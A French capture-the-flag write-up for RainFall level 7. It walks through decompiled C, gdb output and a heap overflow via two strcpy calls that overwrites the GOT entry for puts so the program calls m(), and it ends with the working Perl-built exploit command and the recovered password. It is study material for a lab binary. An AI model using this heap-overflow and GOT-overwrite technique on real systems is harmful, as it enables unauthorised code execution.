# Level 7

pass : `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`

## Sources :

```c=
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <time.h>

char c[80];  // 0x00000050

void	m() {
	printf("%s - %d", c, time(0));
}

int		main(int ac, char **av) {
	// void *malloc(size_t size);
	char **a;  // esp+0x1c
	a = malloc(2 * sizeof(char *));
	a[0] = 1;
	a[1] = malloc(8);

	char **b;  // esp+0x18
	b = malloc(2 * sizeof(char *));
	b[0] = 2;
	b[1] = malloc(8);

	// char *strcpy(char *dest, const char *src);
	strcpy(a[1], av[1]);
	strcpy(b[1], av[2]);

	// FILE *fopen(const char *pathname, const char *mode);
	FILE *file;
	file = fopen("/home/user/level8/.pass", "r");

	// char *fgets(char *s, int size, FILE *stream);
	fgets(c, 68, file);  // 0x44

	// 0x8048703 on .rodata segment
	puts("~~");

	return (0);
}
```

## Recherche :

On veut remplacer l'appel de `puts("~~")` par `m()`

Pour faire ça, on va exploiter les deux appels à `strcpy`.
En effet, `strcpy` copy à l'adresse indiqué par le premier élément la chaine contenue dans le second élément.

Ce qu'on veut donc, c'est `&puts` devienne `&m`.

```gdb
(gdb) i functions
All defined functions:

Non-debugging symbols:
0x0804836c  _init
0x080483b0  printf
0x080483b0  printf@plt
0x080483c0  fgets
0x080483c0  fgets@plt
0x080483d0  time
0x080483d0  time@plt
0x080483e0  strcpy
0x080483e0  strcpy@plt
0x080483f0  malloc
0x080483f0  malloc@plt
0x08048400  puts
0x08048400  puts@plt
0x08048410  __gmon_start__
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main
0x08048420  __libc_start_main@plt
0x08048430  fopen
0x08048430  fopen@plt
0x08048440  _start
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  m
0x08048521  main
0x08048610  __libc_csu_init
0x08048680  __libc_csu_fini
0x08048682  __i686.get_pc_thunk.bx
0x08048690  __do_global_ctors_aux
0x080486bc  _fini
```

`m` se trouve à l'adresse **`0x080484f4`**

```gdb
(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
```

Pour `puts`, c'est un peu plus délicat, dans un `jmp` est fait, on va donc choisir directement l'adresse du `jmp`, soit **`0x08049928`**.

Ça, c'est ce que doit faire le second `strcpy`.
`strcpy(b[1], av[2]);`
On le remplacera par `b[1]` = `0x08049928` (`puts`)
`av[2]` = `0x080484f4` (`m`)

Le premier lui fait actuellement :
`strcpy(a[1], av[1]);`
on veut faire en sorte d'écrire dans `b[1]`, et y mettre la valeure de l'adresse de `puts`.
Or `a` et `b` sont contingent en mémoire, donc si on écrit suffisement loin dans a, on se mettra à écrire dans b.


```gdb
(gdb) r ABCDEFGHIJKLMNOPQRSTUVWXYZ abcd
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level7/level7 ABCDEFGHIJKLMNOPQRSTUVWXYZ abcd

Breakpoint 1, 0x080485a0 in main ()
(gdb) ni
0x080485a5 in main ()
(gdb) x/x $esp+0x18
0xbffff708:     0x0804a028
(gdb) x/2x 0x0804a028
0x804a028:      0x54535251      0x58575655
```

Ici, on voit bien que le premier agument `ABCDEFGHIJKLMNOPQRSTUVWXYZ` a été écrit dans `b` (`$esp+0x18`), et du coup à partir de la lettre 'U' (`0x55`), 20eme lettre dans `b[1]`.

Parfait !
On a tout pour notre script :
`./level7 $(perl -e 'print "A"x(20)."\x28\x99\x04\x08"') $(perl -e 'print "\xf4\x84\x04\x08"')`

## Exploit :

```bash
level7@RainFall:~$ ./level7 $(perl -e 'print "A"x(20)."\x28\x99\x04\x08"') $(perl -e 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1591626293
```
